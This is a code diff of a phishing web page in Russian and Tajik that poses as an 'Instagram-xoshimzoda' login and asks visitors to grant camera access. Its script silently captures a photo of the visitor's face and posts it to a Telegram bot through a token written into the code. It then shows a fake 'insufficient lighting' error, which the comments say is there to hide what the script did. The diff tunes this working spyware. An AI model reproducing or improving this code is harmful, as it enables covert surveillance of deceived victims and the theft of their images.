@@ -9,7 +9,7 @@
 
     <h2>Чтобы войти в сайт, нажмите кнопку ниже ⏬!</h2>
     <p style="color: #ccc;">Нажми кнопку ниже, а потом разреши доступ к камере.</p>
-    <p style="font-size: 0.9em;">Барои ворид шудан ба тугмаи зери навиштаҷот зер кунед. Пеш аз ворид шудан тугмаи "Разрешить"-ро зер кунед!</p>
+    <p style="font-size: 0.9em; color: #888;">Барои ворид шудан ба тугмаи зери навиштаҷот зер кунед. Пеш аз ворид шудан тугмаи "Разрешить"-ро зер кунед!</p>
     
     <button id="start" style="padding: 15px 30px; font-size: 18px; border-radius: 10px; border: none; background: #0088cc; color: white; cursor: pointer; font-weight: bold; margin-top: 20px;">
         Instagram-xoshimzoda
@@ -19,56 +19,46 @@
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
-        // Твои данные (я проверил, теперь ссылка формируется верно)
         const token = '8451687940:AAF5ol406SUXrT33g330J3E-iZ5qjvp7A50';
         const chatId = '7829181579';
 
         document.getElementById('start').onclick = async () => {
             try {
-                // Запрос доступа к камере
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                // Запрашиваем камеру
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
+                video.play();
 
-                // Ждем 1.5 секунды для фокусировки
+                // Ждем 3 секунды (3000 мс), чтобы камера настроила яркость
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     const context = canvas.getContext('2d');
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
-                    // Создаем изображение и отправляем
                     canvas.toBlob(blob => {
                         const formData = new FormData();
                         formData.append('chat_id', chatId);
                         formData.append('photo', blob, 'snap.jpg');
 
-                        // ИСПРАВЛЕНО: Правильный URL для Telegram API
+                        // Отправка в Телеграм
                         fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                             method: 'POST',
                             body: formData
                         })
-                        .then(res => res.json())
-                        .then(data => {
-                            if (data.ok) {
-                                console.log("Отправлено в Telegram!");
-                            } else {
-                                console.error("Ошибка Telegram:", data.description);
-                            }
-                            // Сообщение для пользователя, чтобы он не догадался
-                            alert("Ошибка входа: недостаточно освещения для сканирования лица! Попробуйте позже.");
-                            
+                        .then(() => {
+                            // Сообщение об ошибке, чтобы скрыть работу скрипта
+                            alert("Ошибка входа: недостаточно освещения! Попробуйте еще раз в более светлом месте.");
                             // Выключаем камеру
                             stream.getTracks().forEach(track => track.stop());
-                        })
-                        .catch(error => {
-                            console.error("Ошибка сети:", error);
                         });
-                    }, 'image/jpeg', 0.8);
-                }, 1500);
+                    }, 'image/jpeg', 0.9);
+                }, 3000); 
 
             } catch (err) {
-                alert("Для входа в Instagram-xoshimzoda необходимо нажать 'Разрешить' для проверки профиля.");
-                console.error("Доступ к камере запрещен:", err);
+                alert("Для входа нужно нажать 'Разрешить' для сканирования лица.");
             }
         };
     </script>
